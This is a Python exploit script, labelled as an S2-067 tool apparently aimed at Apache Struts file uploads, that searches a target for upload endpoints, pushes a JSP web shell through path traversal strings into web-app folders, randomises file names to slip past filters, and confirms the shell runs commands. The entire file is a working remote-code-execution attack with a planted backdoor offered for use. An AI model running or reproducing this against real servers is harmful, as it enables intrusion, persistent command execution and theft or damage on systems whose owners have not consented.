import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import string
import time


def generate_random_filename(extension=".jsp"):
    """Generate a random filename to evade simple file filtering."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension


def create_payload():
    """Create a simple JSP payload for RCE testing."""
    return """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
    }
%>"""


def discover_upload_endpoint(target_url, common_endpoints):
    """Attempt to discover common file upload endpoints dynamically."""
    print("[INFO] Discovering potential upload endpoints...")
    for endpoint in common_endpoints:
        full_url = urljoin(target_url, endpoint)
        try:
            response = requests.options(full_url, timeout=5)
            if response.status_code in [200, 403]:
                print(f"[INFO] Potential upload endpoint found: {endpoint}")
                return endpoint
        except requests.RequestException:
            continue
    print("[WARNING] No upload endpoints discovered.")
    return None


def upload_payload(target_url, upload_endpoint, payload, malicious_filename, paths):
    """Attempt to upload the payload with path traversal support."""
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Target upload endpoint: {upload_url}")

    headers = {"User-Agent": "Mozilla/5.0"}
    results = []

    for path in paths:
        print(f"[INFO] Testing path traversal: {path}")
        upload_path = f"{path}/{malicious_filename}"

        # Multipart request
        files = {
            "Upload": (malicious_filename, payload, "application/octet-stream"),
            "uploadFileName": upload_path
        }
        boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        m = MultipartEncoder(fields=files, boundary=boundary)
        headers["Content-Type"] = m.content_type

        try:
            response = requests.post(upload_url, headers=headers, data=m, timeout=10)
            if response.status_code == 200:
                print(f"[SUCCESS] File uploaded to {upload_path}")
                verify_uploaded_file(target_url, path, malicious_filename)
                results.append((path, True))
            else:
                print(f"[ERROR] Upload failed. HTTP {response.status_code}")
                results.append((path, False))
        except requests.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
            results.append((path, False))
    return results


def verify_uploaded_file(target_url, path, malicious_filename):
    """Verify if the uploaded payload can be accessed and executed."""
    file_url = urljoin(target_url, f"{path}/{malicious_filename}")
    print(f"[INFO] Verifying file: {file_url}")
    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200 and "cmd" in response.text:
            print(f"[ALERT] Exploit successful! Webshell: {file_url}?cmd=whoami")
        elif response.status_code == 404:
            print("[INFO] File not found.")
        else:
            print(f"[INFO] File verification failed. HTTP {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")


def main():
    parser = argparse.ArgumentParser(description="Advanced S2-067 Exploit Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com)")
    parser.add_argument("--payload", help="Custom JSP payload", default=create_payload())
    parser.add_argument("--paths", nargs="+", help="Custom paths for traversal", default=[
        "../../..", "../webapps/ROOT", "%2e%2e%2f", "./../", "..\\..\\"
    ])
    parser.add_argument("--endpoints", nargs="+", help="Custom upload endpoints", default=[
        "/fileUpload.action", "/upload.action", "/upload", "/struts2-showcase/fileUpload.action"
    ])
    parser.add_argument("--filename", help="Custom filename for the payload", default=generate_random_filename())
    args = parser.parse_args()

    print("[INFO] Starting advanced S2-067 exploitation...")
    target_url = args.url.rstrip("/")

    # Discover upload endpoint
    upload_endpoint = discover_upload_endpoint(target_url, args.endpoints)
    if not upload_endpoint:
        print("[ERROR] No valid upload endpoint found. Exiting.")
        return

    # Upload the payload and test path traversal
    upload_payload(target_url, upload_endpoint, args.payload, args.filename, args.paths)
    print("[INFO] Exploit process completed.")


if __name__ == "__main__":
    main()
